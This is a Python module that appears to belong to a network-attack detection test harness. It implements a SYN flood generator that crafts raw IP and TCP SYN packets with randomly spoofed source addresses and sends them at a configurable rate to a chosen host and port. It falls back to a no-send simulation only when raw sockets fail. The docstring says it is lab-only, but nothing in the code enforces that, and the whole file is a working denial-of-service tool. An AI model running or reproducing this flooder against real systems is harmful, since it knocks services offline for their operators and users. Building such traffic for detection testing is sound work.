"""
SYN Flood attack generator with Scapy/raw-socket and pure-Python simulation modes.

TEST-ONLY MODULE / SIMULATION HARNESS:
This generator is strictly for offline testing, dataset generation, and pipeline
benchmarking in controlled lab environments. It is never active in production ingress.
"""
from __future__ import annotations

import logging
import random
import socket
import struct
import threading
import time
from typing import Optional

logger = logging.getLogger(__name__)


def _random_ip() -> str:
    return f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _build_ip_header(src_ip: str, dst_ip: str, proto: int = 6, payload_len: int = 20) -> bytes:
    ver_ihl = (4 << 4) | 5
    tos = 0
    total = 20 + payload_len
    ident = random.randint(0, 65535)
    flags_frag = 0
    ttl = random.randint(48, 128)
    checksum = 0
    src = socket.inet_aton(src_ip)
    dst = socket.inet_aton(dst_ip)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl, tos, total, ident, flags_frag,
        ttl, proto, checksum, src, dst,
    )
    checksum = _checksum(header)
    return struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl, tos, total, ident, flags_frag,
        ttl, proto, checksum, src, dst,
    )


def _build_tcp_syn(src_port: int, dst_port: int) -> bytes:
    seq = random.randint(0, 2**32 - 1)
    ack_seq = 0
    data_off = 5 << 4
    flags = 0x002  # SYN
    window = 65535
    checksum = 0
    urgent = 0
    return struct.pack(
        "!HHIIBBHHH",
        src_port, dst_port, seq, ack_seq,
        data_off, flags, window, checksum, urgent,
    )


class SynFloodGenerator:
    """
    Sends raw TCP SYN packets with spoofed source IPs or runs in safe simulation mode.
    """

    def __init__(
        self,
        target_ip: str = "127.0.0.1",
        target_port: int = 80,
        rate_pps: int = 100,
        duration_sec: float = 10.0,
        force_simulation: bool = False,
        stop_event: Optional[threading.Event] = None,
    ):
        self.target_ip = target_ip
        self.target_port = target_port
        self.rate = rate_pps
        self.duration = duration_sec
        self.force_simulation = force_simulation
        self.stop_event = stop_event or threading.Event()
        self.sent = 0

    def run(self) -> int:
        interval = 1.0 / self.rate if self.rate > 0 else 0.01
        end_time = time.time() + self.duration
        s = None
        use_raw = False

        if not self.force_simulation:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                use_raw = True
            except (PermissionError, OSError):
                use_raw = False
                s = None

        logger.info(
            "SYN Flood started: %s:%d rate=%d pps mode=%s",
            self.target_ip, self.target_port, self.rate,
            "raw" if use_raw else "simulation",
        )

        try:
            while time.time() < end_time and not self.stop_event.is_set():
                src_ip = _random_ip()
                src_port = random.randint(1024, 65535)
                tcp_hdr = _build_tcp_syn(src_port, self.target_port)
                ip_hdr = _build_ip_header(src_ip, self.target_ip, proto=6, payload_len=len(tcp_hdr))
                pkt = ip_hdr + tcp_hdr

                if use_raw and s:
                    try:
                        s.sendto(pkt, (self.target_ip, 0))
                    except OSError:
                        pass
                self.sent += 1
                if interval > 0:
                    time.sleep(interval)
        finally:
            if s:
                try:
                    s.close()
                except Exception:
                    pass

        return self.sent
